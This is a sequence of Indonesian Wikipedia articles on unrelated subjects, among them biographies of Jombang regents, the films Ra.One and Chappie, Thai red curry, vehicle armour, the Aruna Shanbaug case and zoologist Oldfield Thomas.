Benih yang Tumbuh – Satu Abad GKJ Purbalingga, Ds. Joesoep Marmojoewono, 1966

150 Tahun Jejak Langkah Pekabaran Injil di Purbalingga - 150 Tahun GKJ Purbalingga, Panitia Hari Ulang Tahun Gereja Kristen Jawa Purbalingga, 2016


</doc>
<doc id="1754129" url="https://id.wikipedia.org/wiki?curid=1754129" title="Ra.One">
Ra.One

Ra.One adalah sebuah film pahlawan super film fiksi ilmiah India 2011 yang disutradarai oleh Anubhav Sinha, dan dibintangi oleh Shah Rukh Khan, Arjun Rampal, Kareena Kapoor, Armaan Verma, Shahana Goswami dan Tom Wu dalam peran pivotal. Skripnya, yang ditulis oleh Sinha dan Kanika Dhillon, aslinya sebagai sebuah gagasan dari Sinha ketika ia mengurusi iklan televisi. Film tersebut mengisahkan tentang Shekhar Subramanium (Khan), seorang perancang permainan yang membuat permainan berbasis sensor gerak di mana peran antagonis-nya (Ra.One) memiliki lebih ketimbang peran protagonis-nya (G.One).

Film tersebut kemudian memenangkan sejumlah penghargaan karena aspek-aspek teknikalnya, yakni satu Penghargaan Film Nasional, satu Penghargaan Filmfare dan empat Penghargaan Akademi Film India Internasional.



</doc>
<doc id="1754130" url="https://id.wikipedia.org/wiki?curid=1754130" title="Suwoto Adiwibowo">
Suwoto Adiwibowo

Kolonel Art. (Purn.) H. Soewoto Adiwibowo (EYD : Suwoto Adiwibowo; ) adalah Bupati Jombang yang menjabat pada periode 1993-1998.

Soewoto lahir di saat Jepang menjajah Indonesia. Ia lahir di Bojonegoro 20 Desember 1944, tepatnya di Desa Kadipaten, Kecamatan kota. Soewoto merupakan anak ke-3 dari 11 bersaudara dari pasangan Samudi Kartodihardjo dan Rukmi. Masa kecilnya tidak jauh berbeda dengan anak desa pada umumnya. Bermain beragam permainan seperti perang-perangan, bermain kasti, hingga bermain sepak bola bersama teman sebayanya. Dari kedua orangtuanya itulah Soewoto kecil selalu diajarkan kesederhanaan. Maklum saja, kehidupan keluarganya bisa dikatakan pas-pasan. Bahkan ia mengakui, bisa makan enak hanya setahun sekali, yakni pada saat lebaran.

Saat usianya menginjak tujuh tahun, ia didaftarkan oleh ayahnya bersekolah SR (Sekolah Rakyat) di Desa Kadipaten. Meski dari keluarga kurang mampu, tetapi soal pelajaran Soewoto kecil terbilang moncer. Ia tidak pernah sekalipun tinggal kelas. Hasilnya, pada tahun 1958 ia lulus SR (setingkat SD). Soewoto kemudian melanjutkan sekolah ke SMP (Sekolah Menengah Pertama) Bojonegoro yang notabene satu-satunya. Ia lulus SMP Negeri Bojonegoro pada tahun 1961. Selanjutnya, ia meneruskan pendidikan di SMA Negeri Bojonegoro. Di sekolah itu, jurusan B (ilmu pasti) yang menjadi pilihannya. Tepat tahun 1964, Soewoto menyelesaikan masa SMA nya.

Selepas SMA, ia berniat untuk bekerja.Namun, ia lebih tertarik untuk menjadi seorang taruna ABRI (sekarang TNI). Semua itu berawal ketika keponakannya yang notabene terlebih dulu lulus dari AMN di Magelang cuti kedinasan. Ia akhirnya diterima dan menjalani pendidikan militer selama tiga tahun, yakni mulai tahun 1964 hingga lulus pada 1967. Ia lulus AMN dengan pangkat Letnan Dua.

Pada tahun 1968, tugas pertamanya di Batalyon Artileri Medan (Yon Armed) VIII di Jember. Setelah itu, tahun 1975 ia dipindahkan tugas ke Pusat Pendidikan (Pusdik) Armed Cimahi, Jawa Barat. Di pusat pendidikan tersebut, Soewoto bertugas selama enam tahun. Selanjutnya, pada 1981, ia menjabat sebagai Komandan Batalyon Armed XII di Ngawi. Tiga tahun menjabat sebagai Komandan Batalyon, ia kemudian dipindah jabatan sebagai staf Markas Besar (Mabes) ABRI di Jakarta, yakni mulai tahun 1984. Baru pada tahun 1990, ia kembali bertugas di Jawa Timur, saat itu ia dipercaya sebagai Komandan Resimen Armed/Kostrad yang bermarkas di Singosari, Malang. Di tempat tersebut, bapak empat anak ini hanya bertugas selama dua tahun. Karena pada 1992, ia dipindah lagi ke Kodam V/Brawijaya sebagai Asisten Perencana dengan pangkat Kolonel.

23 Agustus 1993, Soewoto mendapatkan tugas karya dari pemerintah pusat untuk menjabat sebagai Bupati Jombang menggantikan Tarmin Hariadi. Ia dilantik oleh Gubernur Soelarso, yang mana pelantikannya ini dihadiri oleh ratusan orang.

Soewoto menyadari, Jombang merupakan basis pondok pesantren. Oleh karenanya, membangun hubungan yang sinergis antara pemerintah dengan pondok pesantren adalah suatu keniscayaan. Nah, sehari setelah pelantikan, pria kelahiran Bojonegoro ini mengumpulkan seluruh ulama kota santri di Pendopo Kabupaten setempat. Hari itu, ia memperkenalkan diri sekaligus mengajak seluruh ulama untuk bergandeng tangan demi kemajuan Jombang.

Setelah itu, ia mulai melakukan pendekatan ke masyarakat Jombang. Karena Soewoto berprinsip, sebaik apapun program yang ia gulirkan, tanpa dukungan dari masyarakat luas tentunya hasilnya akan sia-sia. Maka tidak heran, selama lima tahun menjabat sebagai bupati, sebanyak 306 desa di Kabupaten Jombang pernah dikunjunginya beserta istri. Langkah itu juga ia wujudkan dengan membuat media untuk membangun komunikasi dengan masyarakatnya. Salah satunya membuat tabloid ”Gema Desa” yang disingkat Masa. Tabloid itu didistribusikan ke seluruh desa yang ada di Jombang. Harapannya, akan terbangun komunikasi dua arah antara pemerintah dan masyarakat. Dengan begitu pembangunan yang ia gulirkan senapas dengan keinginan masyarakat.

Peran Soewoto yang pertama dilakukan adalah memunculkan ikon Kabupaten Jombang lewat piala Adipura. Ia tak pernah lelah mengajak masyarakat untuk senantiasa menjaga kebersihan lingkungan. Hasilnya tidak sia-sia, pada tahun pertama kepemimpinannya, Kabupaten Jombang berhasil menyabet piala bergengsi dari Presiden Soeharto kala itu. Dengan diraihnya penghargaan tersebut, ia berharap rasa memiliki yang ada di hati masyarakat terhadap daerahnya semakin meningkat. Selanjutnya, jika rasa memiliki sudah muncul, maka akan lebih mudah mengajak masyarakat untuk bergerak membangun daerah. Alhasil, selama dipimpin oleh Bupati Soewoto, Kabupaten Jombang menjadi langganan piala Adipura. Yakni sebanyak empat kali, mulai tahun 1994 hingga tahun 1997. Sebenarnya pada 1998 Jombang bertekad merebut piala Adipura ke lima atau yang biasa disebut dengan Adipura Kencana. Hanya saja, memanasnya situasi politik yang ditandai dengan gerakan refomasi, mengakibatkan anugerah piala tersebut ditiadakan.

Tidak cukup sampai di situ. Awal memimpin Kabupaten Jombang, bapak empat anak ini mulai melirik sektor pertanian yang akan di jadikan primadona dalam pembangunan. Hal itu didasari oleh peta Jombang yang membujur dengan membentuk garis linear. Selanjutnya, untuk memaksimalkan potensi itu, Bupati Soewoto membuatpeta wilayah pertanian. Dalam arti, mana wilayah yang dikhususkan untuk tanaman pangan dan mana wilayah yang dikonsentrasikan untuk non pangan dibuat pembagian secara jelas. Hasilnya tidak sia-sia, pada tahun kedua kepemimpinannya Kabupaten Jombang menjadi percontohan penggunaan pupuk pril atau yang biasa dikenal dengan urea tablet tingkat nasional. Selain itu, Jombang juga dijadikan sebagai salah satu lumbung pangan nasional.

Bergeraknya roda pembangunan yang digagas oleh Soewoto berbuah manis. Hal itu bisa dilihat dari meningkatnya jumlah PAD (Pendapatan Asli Daerah) saat itu. Ia mencatat, kala pertama menjabat sebagai bupati, jumlah PAD Kabupaten Jombang hanya sebesar Rp 2,1 miliar per tahun. Akan tetapi jumlah itu meningkat tajam pada akhir masa jabatannya, yakni tembus Rp 11,6 miliar atau ada peningkatan sekitar Rp 9 miliar.

Terobosan-terobosan selanjutnya terus dilakukan oleh Bupati Soewoto, semisal masalah pelaksanakan ibadah haji. Saat itu pelaksanaan haji di Jombang cenderung semrawut. Tidak jarang masyarakat bawah yang sudah telanjur menjual sawah untuk ibadah haji gagal berangkat hanya karena terganjal kuota. Kondisi itu diperparah dengan maraknya rekomendasi dari oknum pejabat. Praktis, seseorang yang punya kedekatan dengan pejabat bisa dengan mudah mendapatkan kuota. Sedangkan bagi masyarakat bawah, harus rela antre dengan ketidakpastian kapan bisa berangkat. Atas dasar itu, pada tahun 1997 pelaksanaan haji di Jombang menggunakan sistem undian alias nomor urut.

Teknisnya, seluruh yang mendaftar haji dicatat. Pada hari yang sudah ditentukan, para pendaftar dikumpulkan di alun-alun setempat. Kemudian mereka mengambil nomor undian yang sudah dimasukkan dalam kotak. Dari situlah para jamaah haji mendapatkan nomor urut dan mengetahui apakah dirinya berangkat ke tanah suci atau tidak. Semisal, jumlah kuota haji pada saat itu 100 orang, padahal jamaah yang mendaftar ada 150 orang. Setelah mengambil nomor urut, maka akan diketahui siapa saja yang mendapatkan nomor 1 hingga 100. Merekalah yang dipastikan berangkat ibadah haji, selebihnya harus menunggu tahun berikutnya.

Dengan metode itu, asas keadilan lebih dikedepankan. Menariknya lagi, waktu itu Jombang merupakan satu-satunya daerah yang menggunakan sistem undian. Tak heran, terobosan itu sanggup membuat ”iri” Departemen Agama (Depag) Provinsi Jawa Timur. Selanjutnya mereka melakukan studi banding tentang metode pemberangkatan haji yang digagas oleh Bupati Soewoto. Gayungpun bersambut. Pemerintah pusat juga melirik metode baru tersebut. Hal itu ditandai dengan datangnya 12 orang dari Kementrian Agama untuk melihat secara langsung pemberangkatan haji dengan sistem undian itu. Rencananya, apa yang telah dilakukan oleh Kabupaten Jombang akan diadopsi oleh pemerintah pusat. Namun belum sempat rencana terwujud, gerakan Reformasi 1998 bergulir.

Suksesnya pelaksanaan MTQ (Musabaqah Tilawatil Quran) tingkat Jawa Timur di Jombang pada tahun 1996. Selain sukses sebagai tuan rumah, kota santri Jombang juga sukses sebagai juara umum. Padahal persiapan untuk menggelar momen akbar itu cukup singkat, yakni hanya dua bulan. Sebenarnya, ada dua daerah yang terpilih menjadi tuan rumah dalam pelaksanaan MTQ waktu itu, yaitu Madura dan Bojonegoro. Hanya saja, saat pelaksanaan MTQ kurang tiga bulan, dua daerah tersebut menyatakan tidak sanggup. Akhirnya Gubernur Jawa Timur saat itu, H. Basofi Soedirman, memanggil Bupati Soewoto. Dalam pertemuan itu, gubernur meminta agar Jombang menjadi tuan rumah. Kesempatan itu tidak disia-siakan begitu saja. Bupati segera bekerja keras dan membentuk kepanitiaan MTQ. Alun-alun yang terletak di depan Pendopo Kabupaten disulap menjadi masjid raksasa. Di setiap sudutnya dipasang menara yang lengkap dengan kubah. Ternyata mepetnya persiapan justru menjadikan semangat tersendiri bagi Kabupaten Jombang. Terbukti, Jombang berhasil meraih sukses ganda. Pertama, pelaksanaan MTQ berjalan cukup baik. Kedua, Jombang berhasil menyabet gelar juara umum. Hingga kini, menara di setiap sudut alun-alun Jombang itu masih terawat dengan baik.

Pada era kepemimpinan Soewoto pula, sejumlah gapura masuk Kota Jombang dibangun. Gapura itu hingga kini masih ada, yakni berada di Desa Temuwulan, Kecamatan Perak, dan gapura masuk kota yang ada di wilayah Kecamatan Peterongan. Kedua gapura ini dibangun tahun 1997. Pembangunan batas kota itu bukan tanpa sebab. Salah satunya adalah untuk membedakan mana wilayah kota dan mana kawasan non kota. Buah tangan Soewoto lainnya adalah gedung DPRD yang berada di Jalan Wahid Hasyim saat ini. Sebelumnya, gedung wakil rakyat Kabupaten Jombang itu berada di sebelah selatan kantor Pemkab lama (sekarang kantor Badan kesatuan bangsa, politik dan perlindungan masyarakat). Karena tempat tersebut dirasa kurang layak, akhirnya dibangunlah gedung DPRD baru yang sebelumnya merupakan gedung pertemuan.

Soewoto melepas masa lajangnya pada 9 Maret 1969. Ia menyunting gadis kelahiran 24 September 1951, Ninik Darmini, yang juga masih tetangganya satu kampung di Bojonegoro. Dari perkawinan itu, pasangan Soewoto Adiwibowo dan Ninik Darmini dikarunia empat orang anak yang semuanya perempuan. Mereka adalah:
Kini anak dari mantan bupati ini semuanya sudah berkeluarga. Namun, salah satu dari mereka ada yang masih tinggal di Jombang. Sehingga mantan bupati ini meski tinggal di Malang (Perumahan Pondok Blimbing Indah Araya Blok B-8 No 8.), dalam sekali waktu masih menyempatkan waktu untuk mengunjungi kabupaten yang pernah ia pimpin selama lima tahun.



</doc>
<doc id="1754136" url="https://id.wikipedia.org/wiki?curid=1754136" title="Affandi (disambiguasi)">
Affandi (disambiguasi)

Affandi dapat mengacu kepada beberapa hal berikut:



</doc>
<doc id="1754137" url="https://id.wikipedia.org/wiki?curid=1754137" title="Affandi (bupati)">
Affandi (bupati)

Kolonel Art (Purn.) Drs. H. Affandi, M.Si () adalah mantan Bupati Jombang yang menjabat pada periode 1998-2003. Ia dikenal sebagai bupati yang religius dari kalangan militer

Affandi dikenal sebagai bupati yang kepemimpinannya bercirikan keislaman. Upaya itu ditempuh dengan menerapkan manajemen islami dan hubungan kerja menurut konsep Agama Islam. Antara lain dengan anjuran pemakaian jilbab bagi karyawati di lingkup Pemkab dan membudayakan salam ketika pertemuan untuk mengungkapkan rasa syukur, maka ia selalu mengajak hadirin di setiap acara yang ia hadiri untuk mengawali acara dengan mengucapkan tiga kali kalimat hamdalah.

Salah satu bentuk terobosan pada masa kepemimpinan Bupati Affandi adalah pemaksimalan peran dan fungsi Badan Amil Zakat Kabupaten. Bahkan mendorong organisasi serupa di masyarakat untuk memajukan ekonomi umat melalui pengelolaan zakat secara amanah dan profesional. Maka sejak saat itu ada program pengentasan kemiskinan dan beasiswa bagi anak yang orangtuanya tidak mampu dari dana zakat, infaq, dan shodaqoh kaum muslimin. Semenjak di bawah kepemimpinan Bupati Affandi, majelis-majelis pengajian dan istighotsah terus digalakkan. Antara lain yang dijadikan agenda rutin setiap hari Jumat pagi di lingkup pemerintah Kabupaten Jombang. Begitulah semangatnya menerjemahkan konsep-konsep kepemimpinan islami sampai-sampai bedug masjid pun ditempatkan di sebuah sudut Pendopo Kabupaten, seolah bersanding mesra dengan gamelan yang dipajang di sisi lain ruang yang sama.

Setelah memimpin Jombang selama lima tahun, akhirnya ia purna tugas sebagai Bupati Jombang. Untuk memberi kesan dan penghormatan kepada pengayom Jombang ini, dilakukan prosesi kirab boyongan dari Pendopo Kabupaten Jombang ke rumahnya di dekat Embong Miring, Desa Denanyar, Kecamatan Jombang. Prosesi tersebut menggunakan rombongan dokar dan becak yang sudah disiapkan sebelumnya.

Mantan Bupati Jombang Drs. H. Affandi, M.Si meninggal dunia pada hari Senin, 22 Mei 2017. Sebelumnya ia dirawat di Rumah Sakit Darmo Surabaya akibat penyakit yang dideritanya. Sedangkan pangkat terakhir di Jajaran TNI adalah Kolonel (ART) dengan sejumlah bintang jasa. Jenasah H.Affandi dimakamkan di TPU Pulo Samporno, Kabupaten Jombang pada hari Selasa, 23 Mei 2017 sekitar Pukul 10.00 WIB dan dilangsungkan secara militer yang dipimpin oleh Dandim 0814/Jombang Letkol Arh M. Fatkhurahman.


</doc>
<doc id="1754138" url="https://id.wikipedia.org/wiki?curid=1754138" title="Kaeng phet">
Kaeng phet

Kaeng phet atau kari merah (; , , "terjemahan: sup pedas") adalah masakan Thailand populer yang dibuat dari campuran bumbu kari merah, santan, dan daging; biasanya daging ayam, babi, atau sapi.

Bumbu dasar kari merah ( ) secara tradisional dibuat dari bahan segar yang dihaluskan atau dilumat dengan menggunakan cobek dan ulekan. Bumbu ini tergolong bumbu basah, namun biasanya bumbu kering dahulu yang dihaluskan. Warna merah berasal dari cabai merah kering besar ( ) – yang merupakan cabai merah "prik chee fa" yang dikeringkan.

Bumbu kari merah terdiri atas campuran cabai merah kering, bawang merah, bawang putih, lengkuas, terasi, garam, kulit jeruk purut, ketumbar, biji ketumbar, jintan putih, lada, dan sereh. Di pasar tradisional Thailand, bumbu kari merah segar produksi massal siap pakai dijual, biasanya dalam tumpukan pasta bumbu berwarna merah. Kini bumbu kari merah Thai dalam botol atau toples juga tersedia di pasar swalayan dengan merek-merek tertentu.

Bumbu kari merah halus tadi dimasak dalam wajan dengan minyak goreng, kemudian ditambahkan santan kelapa. Kemudian, irisan daging sebagai lauk sumber protein, dimasukkan ke dalam campuran kari merah berkuah ini. Beragam jenis daging dapat digunakan untuk membuat kari merah, antara lain daging ayam, babi, sapi, udang, bahkan daging eksotik seperti daging paha kodok atau daging ular. Resep paling lazim menggunakan daging ayam, babi, atau sapi. Bumbu tambahan lainnya kemudian ditambahkan, antara lain kecap ikan, gula, irisan daun jeruk purut, terong sayur bulat, rebung, daun kemangi Thailand ("bai horapha").

Tahu, daging tiruan vegetarian, atau sayur-sayuran seperti labu dan blewah dapat juga digunakan sebagai pengganti daging, untuk membuat versi vegetarian kaeng phet. Akan tetapi karena adanya kandungan terasi udang dalam bumbu kari, maka hidangan ini tidak sepenuhnya vegetarian. Hidangan ini biasanya disajikan berkuah dengan kekentalan seperti sup, dan disajikan dengan nasi putih.

Bumbu kari merah sendiri kerap kali dijadikan bumbu tambahan untuk menambah citarasa makanan lainnya, seperti "thot man pla" (semacam perkedel ikan) and "sai ua" (sosis Chiang Mai panggang).




</doc>
<doc id="1754149" url="https://id.wikipedia.org/wiki?curid=1754149" title="Perisai kendaraan">
Perisai kendaraan

Perisai kendaraan, atau disebut juga perisai tempur, umumnya digunakan pada kendaraan militer dengan tujuan menahan dampak berbagai serpihan peluru, rudal, atau selongsong terhadap personil militer yang berlindung di dalam kendaraan ketika terjadi serangan musuh. Berbagai kendaraan tempur lapis baja yang memiliki perisai antara lain adalah tank, pesawat udara, dan kapal terbang.

Kendaraan sipil dapat pula dilengkapi perisai. Penggunaannya antara lain pada berbagai kendaraan yang digunakan oleh wartawan, pejabat, dan orang-orang yang bekerja di daerah konflik atau tempat-tempat di mana kekerasan adalah hal yang umum, serta limusin kepresidenan. Mobil berperisai juga secara rutin digunakan oleh perusahaan jasa keamanan untuk membawa uang atau barang berharga lainnya untuk mengurangi risiko perampokan atau pembajakan muatan.

Perisai juga dapat digunakan pada suatu kendaraan untuk melindunginya dari berbagai ancaman yang bukan merupakan serangan yang disengaja. Beberapa wahana antariksa juga dilengkapi dengan perisai khusus untuk melindungi mereka dari dampak mikrometeorit atau fragmen sampah angkasa. Pesawat modern pesawat bermesin jet biasanya telah dilengkapi dengan semacam perisai berupa balut komposit kevlar aramid atau suatu dinding penahan serpihan yang pasangkan pada selubung mesin turbin gasnya, untuk mencegah cedera atau kerusakan pada badan pesawat apabila kipas, kompresor, atau bilah turbinnya terlepas.

Desain dan tujuan kendaraan menentukan jumlah pelat perisai yang dipasangkan, sebab pelat tersebut seringkali sangat berat serta banyaknya perisai akan membatasi mobilitas kendaraan. Untuk mengatasi masalah tersebut, berbagai bahan (misalnya material nano) serta campuran bahan baru saat ini tengah diteliti, antara lain adalah pelat perisai dari kertas bucky dan busa aluminium.


</doc>
<doc id="1754155" url="https://id.wikipedia.org/wiki?curid=1754155" title="Kasus Aruna Shanbaug">
Kasus Aruna Shanbaug

Aruna Ramchandra Shanbaug (1 Juni 1948 – 18 Mei 2015), yang secara alternatif disebut Shanbhag, adalah seorang perawat India yang menjadi pusat perhatian dalam perbincangan tentang eutanasia setelah menjalani empat puluh dua tahun dalam keadaan koma akibat dari serangan seksual.

Pada 1973, ketika bekerja sebagai seorang perawat junior di Rumah Sakit Peringatan Raja Edward, Parel, Mumbai, Shanbaug diserang secara seksual oleh seorang laki-laki yang menjadi petugas kebersihan, Sohanlal Bhartha Walmiki, dan masih dalam kondisi vegetatif setelah serangan tersebut.

Shanbaug meninggal karena pneumonia pada 18 Mei 2015 setelah mengalami kondisi vegetatif persisten selama 42 tahun.

Aruna Shanbaug lahir pada 1948 di Haldipur, Uttar Kannada, Karnataka. Ia bekerja sebagai seorang perawat di Rumah Sakit Peringatan Raja Edward (KEM) di Mumbai. Pada waktu serangan tersebut, ia diangkat menjadi seorang dokter di rumah sakit yang sama.
Pada malam hari 27 November 1973, Shanbaug mendapatkan serangan seksual dari Sohanlal Bhartha Walmiki, seorang petugas kebersihan yang sedang dikontrak di Rumah Sakit Peringatan Raja Edward. Sohanlal menyerangnya ketika ia ganti baju di rumah bawah tanah rumah sakit. Ia mengikatnya dengan rantai anjing dan menyodominya. Ia ditemukan dengan berlumuran darah pada pukul 7:45 am pada pagi hari berikutnya oleh seorang petugas kebersihan.

Sebuah buku non-fiksi yang berjudul "Aruna's Story" menulis tentang kasus tersebut oleh Pinki Virani pada 1998. Duttakumar Desai menulis permainan panggung Marathi "Katha Arunachi" pada 1994–95, yang ditampilkan di tingkat kolese dan kemudian dipanggungkan oleh Vinay Apte pada 2002.

Sebuah novel fiksi Gujarat, "Jad Chetan", ditulis oleh penulis terkenal Harkisan Mehta pada 1985 berdasarkan pada kasus Aruna Shanbaug.

Anumol mengadaptasi permainan panggung Aruna dalam film Malayalam "Maram Peyyumbol".

Penyair India Kumar Gautam berupaya untuk menuangkan simpati terhadap Aruna Shanbaug dalam puisinya "An open letter from Aruna Shanbaug", yang ia terbitkan di blog puisinya.




</doc>
<doc id="1754264" url="https://id.wikipedia.org/wiki?curid=1754264" title="Daftar ketua menteri India saat ini">
Daftar ketua menteri India saat ini

Di Republik India, seorang ketua menteri adalah kepala pemerintah dari setiap dua puluh sembilan negara bagian dan dua wilayah persatuan (Delhi dan Puducherry). Menurut konstitusi India, di tingkat negara bagian, gubernur adalah kepala "de jure", namun wewenang eksekutif "de facto" berada di tangan ketua menteri. Setelah pemilihan majelis legislatif negara bagian, gubernur biasanya mengundang partai (atau koalisi) yang memperoleh kursi mayoritas untuk membentuk pemerintahan. Gubernur melantik ketua menteri yang bertanggung jawab secara kolektif (bersama dengan dewan menteri) kepada majelis tersebut. Apabila ia memperoleh kepercayaan majelis, masa jabatan ketua menteri biasanya paling lama lima tahun, walaupun tidak ada batas jumlah masa jabatan.

Dari tiga puluh satu petahana saat ini, tiga orang di antaranya adalah wanita—Mamata Banerjee di Benggala Barat, Mehbooba Mufti di Jammu dan Kashmir, dan Vasundhara Raje di Rajasthan. Menjabat sejak Desember 1994 (selama ), Pawan Kumar Chamling dari Sikkim memiliki masa jabatan terpanjang. Virbhadra Singh (l. 1934) dari Himachal Pradesh adalah ketua menteri tertua, sementara Pema Khandu (l. 1979) dari Arunachal Pradesh adalah yang termuda. Enam petahana merupakan anggota Kongres Nasional India, tiga belas petahana berasal dari Partai Bharatiya Janata dan dua petahana berasal dari Partai Komunis India (Marxis); tidak ada partai lainnya yang memiliki lebih dari satu ketua menteri.



</doc>
<doc id="1754277" url="https://id.wikipedia.org/wiki?curid=1754277" title="Tarmin Hariadi">
Tarmin Hariadi

Kolonel Inf. (Purn.) Tarmin Hariadi () adalah Bupati Jombang yang menjabat pada periode 1988 hingga 1993 dan Bupati Lumajang yang menjabat pada periode 1993-1998. Ia adalah bupati yang berasal dari kalangan militer.

Tarmin dilahirkan pada masa pendudukan Jepang di Indonesia, di Desa Karangasem, Kecamatan Karangwareg, Cirebon, Jawa Barat, pada 14 Agustus 1942. Ia dilahirkan sebagai anak kelima dari enam bersaudara sebagai seorang "ajengan" (kiai “kampung”) yang bernama Kiai Raswan. Meskipun bukan seorang figur kiai besar, Kiai Raswan sangat disegani di kampungnya. Selain sebagai pemangku masjid, dia juga menjadi Imam Masjid di desa tersebut.

Sebagai putera pemangku masjid di desanya, Tarmin Hariadi tidak berbeda dengan anak-anak seusianya. Karena masjid bagi mereka telah dijadikan rumah kedua setelah rumah orang tua masing-masing. Kebiasaan tidur di masjid usai sholat isya dan mengaji menjadi keasyikan tersendiri. Terutama bagi anak laki-laki, karena di antara mereka bisa saling bercerita, bercanda, bahkan merajut mimpi indah tentang cita-cita. Rutinitas tidur di masjid atau mushola telah mendorong anak-anak, khususnya di desa Karangwareg, Kecamatan Karangasem, Cirebon sebagai rentetan merajut cita-cita. Artinya mereka berusaha untuk mendekatkan diri kepada Tuhan dengan melakukan puasa sunnah dan salat malam untuk mengimbangi usaha mereguk ilmu sebanyak-banyaknya di bangku sekolah.

Lulusan Akademi Militer Nasional Magelang angkatan 1965 ini pernah menduduki jabatan dari mulai Danton (Komandan Peleton) Yonif 511 Blitar, Danki Pan Yonif 511 Blitar, Wadanyon Wakil Komandan Batalyon 512 Malang, Komandan Batalyon 512 Malang, Komandan Secaba Rindam V Brawijaya, Komandan Distrik Militer 0821 (Dandim) Lumajang, Paban Madya MBS ABRI, Aspers Garnisun Surabaya, Wa Aspers Kodam V Brawijaya, Aspers Kodam V Brawijaya, Aster Kodam V Brawijaya, hingga Wakil Asisten Personalia (Wa Aspers) Kodam V/Brawijaya.

Ada dua hal yang menjadi fokus garapan Bupati Tarmin ketika mengemban amanat memimpin Kabupaten Jombang. Kota yang memiliki seratus lebih pondok pesantren ini seolah bukan hal baru bagi seorang Tarmin yang memang anak Kiai. Dua hal yang menjadi target utama dibagi menjadi program jangka pendek dan jangka panjang. Untuk program jangka pendek adalah pemenuhan kebutuhan masyarakat dengan peningkatan pertanian (pangan), perbaikan prasarana jalan dan lain-lain. Sedangkan program jangka panjang meliputi pembangunan industri untuk ekspor dan mengurangi pengangguran.

Sebagai penunjang percepatan program tersebut dilakukan dari skup internal berupa penerapan disiplin di lingkup pemerintah Kabupaten Jombang. Khusus pada penerapan disiplin kerja dan disiplin kinerja, Bupati Tarmin mengawali rutinitas apel pagi sebelum menjalankan tugas. Melalui kegiatan apel itulah dia dapat menyampaikan hal-hal yang dianggap penting untuk dilaksanakan pada hari itu.

Setelah melaksanakan tugas sebagai Bupati Jombang, Tarmin Hariadi masih mengemban amanat sebagai Bupati Lumajang. Setelah jabatan terakhir sebagai Bupati Lumajang memasuki masa purna jabatan, Tarmin sempat dipromosikan untuk menduduki pos penting jabatan di Provinsi Jawa Timur. Namun dengan kerendahan hati tugas tersebut terpaksa ditolak, karena dia lebih memilih menikmati masa pensiun.

Tidak lama setelah lulus sebagai perwira pada kurun waktu 1965, dia melangsungkan pernikahan dengan pujaan hatinya sewaktu masih sekolah bernama Patonah. Dari pernikahan tersebut pasangan Tarmin Hariadi dan Patonah dikaruniai empat putera-puteri, yakni :
Selain itu ia memiliki 7 cucu.

Pada masa pensiunnya ia aktif dalam kegiatan rutin keagamaan di Malang, Jawa Timur. Selain menjadi ketua paguyuban orang Sunda bernama "Parahiyangan".



</doc>
<doc id="1754332" url="https://id.wikipedia.org/wiki?curid=1754332" title="Chappie (film)">
Chappie (film)

Chappie (ditulis sebagai CHAPPiE) adalah sebuah film fiksi ilmiah 2015 yang disutradarai oleh Neill Blomkamp. Permainan latarnya, yang ditulis oleh Blomkamp dan Terri Tatchell, berdasarkan pada film pendek 2004 karya Blomkamp "Tetra Vaal". Film tersebut dibintangi oleh Sharlto Copley, Dev Patel, Jose Pablo Cantillo, Sigourney Weaver, Hugh Jackman, dan Watkin Tudor Jones (Ninja) dan Yolandi Visser. Film tersebut tayang perdana di New York City pada 4 Maret 2015 dan dirilis di bioskop-bioskop A.S. pada 6 Maret 2015.


"Chappie" adalah film berjangka fitur ketiga Blomkamp sebagai sutradara. Ia menulis permainan latarnya bersama dengan istrinya Terri Tatchell, yang juga membantu menulis "District 9". Pemfilmannya dimulai pada akhir Oktober 2013 di Johannesburg, Afrika Selatan. Pemfilmannya selesai pada Februari 2014. Pengambilan gambar ulang untuk film tersebut dilakukan di British Columbia, Kanada pada April 2014.

Nama dari perusahaan senjata dalam "Chappie" - "Tetravaal" - adalah sebuah rujukan dari film pendek dengan nama yang sama yang dibuat oleh Blomkamp pada 2003



</doc>
<doc id="1754339" url="https://id.wikipedia.org/wiki?curid=1754339" title="Oldfield Thomas">
Oldfield Thomas

(Michael Rogers) Oldfield Thomas FRS FZS (21 Februari 1858 – 16 Juni 1929) adalah seorang ahli zoologi Britania.

Thomas bekerja pada Musium Sejarah Alam ("Natural History Museum"), khususnya mamalia, di mana ia telah mendeskripsikan kurang lebih 2.000 spesies dan subspesies baru untuk pertama kalinya. Ia terpilih untuk jabatan Sekretaris Museum pada tahun 1876, dan pindah ke Departemen Zoologi pada tahun 1878. Pada 1891 Thomas menikahi Mary Kane, putri dari Sir Andrew Clark, yang mewarisi cukup banyak kekayaan; sehingga ia dapat mempekerjakan para pengumpul mamalia dan memberikan hasil koleksi yang didapatkan kepada museum tersebut. Ia sendiri juga melakukan kerja lapangan Eropa barat dan Amerika Selatan. Istrinya berbagi minat yang sama dengannya mengenai peri kehidupan alam, dan menemaninya dalam perjalanan pengumpulan spesimen. Pada 1896 saat William Henry Flower memegang kendali departemen tersebut, ia mempekerjakan Richard Lydekker untuk menata ulang ruang-ruang pameran, sehingga Thomas dapat berkonsentrasi pada spesimen-spesimen baru tersebut. Meskipun secara resmi pensiun dari musium tersebut pada 1923, ia terus melanjutkan kerjanya tanpa terhenti. Ia mengakhiri hidupnya dengan cara menembak dirinya sendiri dalam posisi duduk di meja kerjanya di museum pada 1929 saat usianya 71 tahun, sekitar setahun setelah kematian istrinya, "suatu pukulan berat di mana ia tak pernah berhasil pulih".


</doc>
<doc id="1754355" url="https://id.wikipedia.org/wiki?curid=1754355" title="Darul Ikhsan, Bakongan, Aceh Selatan">
Darul Ikhsan, Bakongan, Aceh Selatan

Darul Ikhsan merupakan salah satu gampong yang ada di kecamatan Bakongan, Kabupaten Aceh Selatan, provinsi Aceh, Indonesia. kode Kemendagri untuk gampong ini yaitu 11.01.01.2015.


</doc>
<doc id="1754356" url="https://id.wikipedia.org/wiki?curid=1754356" title="Padang Berahan, Bakongan, Aceh Selatan">
Padang Berahan, Bakongan, Aceh Selatan

Padang Barahan atau Padang Berahan merupakan salah satu gampong yang ada di kecamatan Bakongan, Kabupaten Aceh Selatan, provinsi Aceh, Indonesia. kode Kemendagri untuk gampong ini yaitu 11.01.01.2016.


</doc>
<doc id="1754361" url="https://id.wikipedia.org/wiki?curid=1754361" title="Larb">
Larb

